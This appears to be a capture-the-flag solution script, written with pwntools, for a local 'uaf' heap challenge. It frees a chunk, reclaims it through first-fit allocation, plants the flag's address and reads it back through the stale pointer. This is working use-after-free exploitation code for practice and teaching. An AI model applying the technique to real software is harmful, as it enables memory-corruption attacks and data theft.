#!/usr/bin/env python

'''
Run with NOPTRACE to have no debugging
'''

import os
from pwn import *

CHAL_BIN = os.path.abspath('./uaf')
CHAL_ELF = ELF(CHAL_BIN)

p = process(['./glibc_versions/ld-2.25.so', CHAL_BIN],
            env={'LD_PRELOAD': os.path.abspath('./glibc_versions/libc-2.25.so')})

gdb.attach(p, '''
python
mappings = gdb.execute('info proc map', to_string=True)
first_elf_mapping = next(l for l in mappings.split('\\n') if '{chal}' in l)
base_addr = int(first_elf_mapping.lstrip().split()[0], 16)
gdb.execute('add-symbol-file "{chal}" {{}}'.format(hex(base_addr + {offset})))
end
b challenge-uaf.c:98
c
'''.format(chal=CHAL_BIN, offset=CHAL_ELF.get_section_by_name('.text').header['sh_offset']))

r = remote('localhost', 9999)
# Print the address of the flag
r.send('4')
l = r.recvline_contains('The flag is at')
flag_addr = int(re.search('(0x[0-9a-f]+)', l).group(1), 16)

# free(strchunks[0])
r.send('2')
r.recvline_contains('reinitialize')

# strchunks[1] = malloc(SIZEOFMALLOCS)
# (because of first-fit behavior, this will result in strchunks[0] == strchunks[1])
r.send('1')
r.recvline_contains('reinitialize')

# Set *strchunks[0] = *strchunks[1] = <address of flag>
r.send('3')
r.recvuntil(':')
r.send(p64(flag_addr))

# Print *strchunks[0] (use after free)
r.recvline_contains('reinitialize')
r.send('4')

l = r.recvline_contains('SP{')
print(l)
pause()
